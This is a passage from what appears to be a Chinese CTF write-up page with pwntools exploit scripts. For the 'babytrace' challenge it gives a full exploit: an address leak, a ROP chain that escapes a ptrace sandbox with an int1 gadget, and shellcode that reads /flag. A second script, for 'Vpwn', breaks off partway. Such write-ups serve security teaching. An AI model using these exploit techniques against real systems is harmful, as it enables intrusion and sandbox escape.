<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="nf">itr</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="exploit"><span class="me-2">exploit</span><a href="#exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>用 <code class="language-plaintext highlighter-rouge">int1</code>​ 或 <code class="language-plaintext highlighter-rouge">int3</code>​ 去中断,只要执行过 中断后， 后面执行的syscall 就没有父进程的限制了（可能时父进程停止了？）</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="err">➜</span>  <span class="n">babytrace</span> <span class="n">ROPgadget</span> <span class="o">--</span><span class="n">binary</span> <span class="p">.</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span> <span class="o">|</span><span class="n">grep</span> <span class="sh">"</span><span class="s">: int1 ; ret</span><span class="sh">"</span>
<span class="mh">0x00000000000c6d6e</span> <span class="p">:</span> <span class="n">int1</span> <span class="p">;</span> <span class="n">ret</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
</pre></td><td class="rouge-code"><pre><span class="c1"># imLZH1
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
</span><span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">'</span><span class="s">119.45.238.17:9999</span><span class="sh">'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./babytrace</span><span class="sh">'</span>
<span class="c1">#binary = './fix/babytrace'
</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
<span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="c1">#print(context.binary.libs)
#libc = ELF('./libc.so.6')
</span>
<span class="c1">#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#brva 0x0D68
brva 0x000D3C
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#io = rmote()
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">choose one &gt;</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">which one?</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">set value?</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">choose one &gt;</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">which one?</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="nf">sleep</span><span class="p">(</span><span class="mf">0.4</span><span class="p">)</span>

<span class="c1">#gdb.attach(io.pid+1,gdbscript)
</span>
<span class="c1">#pause()
</span><span class="nf">show</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">num[-2] = </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rl</span><span class="p">())</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_2_1_stderr_</span><span class="sh">'</span><span class="p">]</span>

<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">show</span><span class="p">(</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">num[-3] = </span><span class="sh">'</span><span class="p">)</span>
<span class="n">elf_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rl</span><span class="p">())</span> <span class="o">-</span> <span class="mi">3656</span>
<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">elf_base</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">elf_base</span><span class="sh">'</span><span class="p">)</span>


<span class="n">buf</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">({</span>
    <span class="mh">0x1F8</span><span class="p">:</span><span class="mh">0x123456</span>
<span class="p">},</span><span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>

<span class="n">idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">3</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x00C75</span> <span class="c1"># read
</span>
<span class="nf">edit</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
<span class="n">libc_rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">rax</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rax</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rbx</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rbx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rcx</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rcx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rdi</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rsi</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rsi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">rdx</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">syscall</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">int1_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x00000000000c6d6e</span> <span class="c1">#: int1 ; ret
</span>

<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x1d8</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x500</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">])</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="n">bss</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">bss</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mh">0xC</span> <span class="o">&lt;&lt;</span> <span class="mh">0xC</span>

<span class="nf">pause</span><span class="p">()</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x1f0</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x300</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">int1_ret</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>

<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>

<span class="n">sc</span>  <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="p">))</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sendfile</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">))</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>

<span class="nf">itr</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-xhlj/assets/image-20250118231351-kmzjnta.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-xhlj/assets/image-20250118231351-kmzjnta.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="参考链接"><span class="me-2">参考链接</span><a href="#参考链接" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<pre><code class="language-url">https://ctftime.org/writeup/20115
</code></pre>

<p>‍</p>

<h2 id="pwn-vpwn"><span class="me-2">Pwn-Vpwn</span><a href="#pwn-vpwn" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
</pre></td><td class="rouge-code"><pre><span class="c1"># imLZH1
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
</span><span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">'</span><span class="s">139.155.126.78:27968</span><span class="sh">'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./Vpwn</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
<span class="c1">#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
</span>
<span class="c1">#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#io = rmote()
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Enter your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">push</span><span class="p">(</span><span class="n">pay</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Enter your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Enter the value to push: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">pop</span><span class="p">():</span>
